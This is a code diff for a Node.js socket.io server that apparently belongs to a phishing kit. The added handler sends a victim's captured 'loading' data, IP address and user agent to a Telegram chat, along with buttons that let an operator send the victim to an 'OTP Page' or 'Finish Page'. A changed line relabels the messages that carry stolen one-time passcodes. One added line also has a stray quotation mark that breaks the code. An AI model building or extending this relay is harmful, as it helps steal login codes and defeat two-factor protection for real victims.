@@ -218,6 +218,18 @@ io.on('connection', (socket, req) => {
         //console.log(data)
     })
 
+    socket.on('loading', (data) => {
+        const opts = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: 'Send User OTP Page', callback_data: `good:${userIP}`}],
+                    [{ text: 'Send User Finish Page't ', callback_data: `bad:${userIP}` }]
+                ]
+            }
+        };
+        bot.sendMessage(chatId, `Loading Page: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
+    })
+
     socket.on('otp', (data) => {
       
         const opts = {
@@ -228,7 +240,7 @@ io.on('connection', (socket, req) => {
                 ]
             }
         };
-        bot.sendMessage(chatId, `OTP: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
+        bot.sendMessage(chatId, `OTP Page: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
     })
 
     bot.on('callback_query', function onCallbackQuery(callbackQuery) {
